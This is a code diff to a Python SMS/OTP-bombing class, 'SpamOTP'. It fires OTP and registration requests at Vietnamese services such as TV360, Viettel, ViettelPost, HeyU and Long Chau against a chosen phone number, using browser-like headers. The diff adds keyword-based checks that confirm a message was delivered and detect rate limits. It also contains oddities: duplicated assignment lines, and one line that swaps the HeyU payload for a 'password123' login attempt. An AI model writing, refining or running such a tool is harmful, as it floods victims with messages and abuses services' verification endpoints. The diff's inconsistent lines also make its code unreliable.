@@ -73,8 +73,38 @@ class SpamOTP:
         else:
             raise ValueError(f"Unsupported method: {method}")
         
+    def validate_response(self, response, service_name):
+        """Strict validation to filter false positives"""
+        try:
+            if response.status_code != 200:
+                return False, f"{service_name}: {response.status_code}"
+            
+            # Check content for success indicators
+            text = response.text.lower()
+            success_keywords = ["success", "thành công", "đã gửi", "sent", "true", '"code":0', '"code": 0', '"status":1', "ok", "otp"]
+            error_keywords = ["error", "lỗi", "fail", "block", "spam", "limit", "too many", "thử lại", "false", '"code":1', '"code":-1']
+            
+            # 1. Check for specific error keywords first
+            for kw in error_keywords:
+                if kw in text:
+                    return False, f"{service_name} Fail: {kw} detected"
+
+            # 2. Check for success keywords
+            for kw in success_keywords:
+                if kw in text:
+                    return True, f"{service_name}: {response.status_code} (Verified)"
+            
+            # 3. If no keywords but 200 OK, lenient pass but marked
+            # return True, f"{service_name}: {response.status_code} (Blind)"
+            # STRICT MODE: If no success keyword, treat as fail to reduce false positives
+            return False, f"{service_name} Fail: No success token"
+
+        except Exception as e:
+            return False, f"{service_name} Error: {e}"
+
     def log(self, message):
         # This method can be overridden by the caller (app.py)
+        # If the message indicates failure (contains 'Fail' or 'Lỗi'), app.py handler will count it as fail
         print(f"[*] {message}")
 
     def tv360(self):
@@ -85,8 +115,10 @@ class SpamOTP:
                 "content-type": "application/json"
             })
             data = {"msisdn": self.phone}
+            data = {"msisdn": self.phone}
             response = self.request('post', url, json=data, headers=headers)
-            self.log(f"TV360: {response.status_code}")
+            is_success, msg = self.validate_response(response, "TV360")
+            self.log(msg)
         except Exception as e:
             self.log(f"TV360 Lỗi: {e}")
 
@@ -99,7 +131,8 @@ class SpamOTP:
                 "referer": "https://vietteltelecom.vn/"
             }
             response = self.request('post', url, headers=headers)
-            self.log(f"Viettel Login: {response.status_code}")
+            is_success, msg = self.validate_response(response, "Viettel Login")
+            self.log(msg)
         except Exception as e:
             self.log(f"Viettel Login Lỗi: {e}")
 
@@ -307,8 +340,10 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"account": self.phone, "function": "SSO_REGISTER", "type": "PHONE", "otpType": "NUMBER"}
+            data = {"account": self.phone, "function": "SSO_REGISTER", "type": "PHONE", "otpType": "NUMBER"}
             response = self.request('post', url, json=data, headers=headers)
-            self.log(f"ViettelPost: {response.status_code}")
+            is_success, msg = self.validate_response(response, "ViettelPost")
+            self.log(msg)
         except Exception as e:
             self.log(f"ViettelPost Lỗi: {e}")
 
@@ -381,8 +416,10 @@ class SpamOTP:
                  "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
             }
             data = {"phone": self.phone, "deviceId": "33FC417B-681E-4C47-A0B8-DC98ED2F0BA8", "platform": "ios"}
+            data = {"username": self.phone, "password": "password123"} 
             response = self.request('post', url, json=data, headers=headers)
-            self.log(f"HeyU: {response.status_code}")
+            is_success, msg = self.validate_response(response, "HeyU")
+            self.log(msg)
         except Exception as e:
             self.log(f"HeyU Lỗi: {e}")
 
@@ -486,7 +523,8 @@ class SpamOTP:
             }
             data = {"phoneNumber": self.phone, "fromSys": "WEBKHLC", "otpType": 0}
             response = self.request('post', url, json=data, headers=headers)
-            self.log(f"Long Chau: {response.status_code}")
+            is_success, msg = self.validate_response(response, "Long Chau")
+            self.log(msg)
         except Exception as e:
             self.log(f"Long Chau Lỗi: {e}")
 
